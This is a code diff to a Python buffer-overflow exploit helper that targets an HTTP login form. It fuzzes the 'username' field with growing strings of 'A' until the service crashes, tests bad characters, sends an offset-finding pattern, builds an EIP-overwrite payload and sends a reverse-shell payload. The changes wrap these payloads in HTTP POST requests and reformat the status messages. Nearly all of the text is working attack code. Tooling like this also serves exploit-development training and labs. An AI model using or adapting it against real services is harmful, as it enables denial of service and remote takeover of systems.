@@ -406,8 +406,8 @@ class Overflow:
 		self.num_bytes_crash = 100
 
 		if not chars and not reverse_payload:
-			print(pe+bld+"[+]"+rst+" Intiating fuzzing procedure...")
-			print(yw+bld+"[!]"+rst+" Press Ctrl+C when the application crashes!!!")
+			print(pe+bld+"[+]"+rst+" -----( Intiating fuzzing procedure )-----")
+			print(yw+bld+"[!]"+rst+" -----( Press Ctrl+C when the application crashes! )-----")
 			while self.num_bytes_crash <= self.max_fuzz_bytes:
 				content = "username=" + "A"*self.num_bytes_crash + "&password=A"
 				buff = self._HTTP_header()
@@ -416,13 +416,13 @@ class Overflow:
 				buff += content
 				soc = self._create_socket()
 				try:
-					print(be+bld+"[+]"+rst+f" Sending payload containing {self.num_bytes_crash} bytes...")
+					print(be+bld+"[+]"+rst+f" -----( Sending payload containing {self.num_bytes_crash} bytes )-----")
 					soc.send(bytes(buff, "utf-8"))
 					soc.close()
 					self.num_bytes_crash += self.fuzz_increment
 					sleep(self.fuzz_interval_seconds)
 				except KeyboardInterrupt:
-					print(rd+bld+"\n[!]"+rst +" Don't forget to set the number of bytes it took to crash the application")
+					print(rd+bld+"\n[!]"+rst +" -----( Don't forget to set the number of bytes it took to crash the application )-----")
 					exit(1)
 				except:
 					print(rd+bld+"[-]"+rst+f" Error occured...")
@@ -446,7 +446,7 @@ class Overflow:
 
 			soc = self._create_socket()
 
-			print(yw+bld+"[+]"+rst+" Sending payload to test bad characters...")
+			print(yw+bld+"[+]"+rst+" -----( Sending payload to test bad characters )-----")
 			try:
 				soc.send(bytes(buff, "utf-8"))
 			except BaseException as err:
@@ -467,7 +467,7 @@ class Overflow:
 
 			soc = self._create_socket()
 
-			print(gn+bld+"[+]"+rst+" Sending reverse shell payload...")
+			print(gn+bld+"[+]"+rst+" -----( Sending reverse shell payload )-----")
 			try:
 				soc.send(bytes(buff, "utf-8"))
 			except socket.error as err:
@@ -488,8 +488,14 @@ class Overflow:
 		soc = self._create_socket()
 
 		with soc:
-			bytes_payload = bytes(payload, "utf-8")
-			print(gn+bld+"[+]"+rst+" Sending Msfpattern payload...")
+			content = "username=" + payload + "&password=A"
+			buff = self._HTTP_header()
+			buff += f"Content-Length: {str(len(content))}\r\n"
+			buff += "\r\n"
+			buff += content
+
+			bytes_payload = bytes(buff, "utf-8")
+			print(gn+bld+"[+]"+rst+" -----( Sending pattern payload )-----")
 			soc.send(bytes_payload)
 		
 
@@ -513,7 +519,12 @@ class Overflow:
 		try:
 			if self.offset:
 				payload = "A"*self.offset + "B"*4 + "C"*(self.num_bytes_crash-self._offset-4)
-				bytes_payload = bytes(payload, "utf-8")
+				content = "username=" + payload + "&password=A"
+				buff = self._HTTP_header()
+				buff += f"Content-Length: {str(len(content))}\r\n"
+				buff += "\r\n"
+				buff += content
+				bytes_payload = bytes(buff, "utf-8")
 			else:
 				raise NoOffsetError("Please run `get_offset` to get and set offset value")
 		except NoOffsetError as err:
